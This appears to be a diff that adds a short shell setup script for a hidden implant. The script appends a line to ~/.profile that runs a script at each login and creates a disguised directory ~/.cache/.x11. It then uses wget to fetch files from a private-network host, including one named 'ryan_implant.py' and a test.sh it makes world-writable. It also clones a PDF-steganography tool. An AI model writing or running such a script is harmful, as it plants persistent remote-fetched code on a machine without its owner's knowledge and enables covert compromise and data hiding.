@@ -1,0 +1,11 @@
+cd ~
+echo "bash ~/.cache/.x11/test.sh" >> .profile
+mkdir -p .cache/.x11
+cd ~/.cache/.x11
+wget http://192.168.20.4:8081/pdf_base.pdf
+wget http://192.168.20.4:8081/bwt.py
+wget http://192.168.20.4:8081/ryan_implant.py
+wget http://192.168.20.4:8081/test.sh
+chmod 777 test.sh
+git clone https://github.com/ncanceill/pdf_hide
+python3 -m venv dev_env
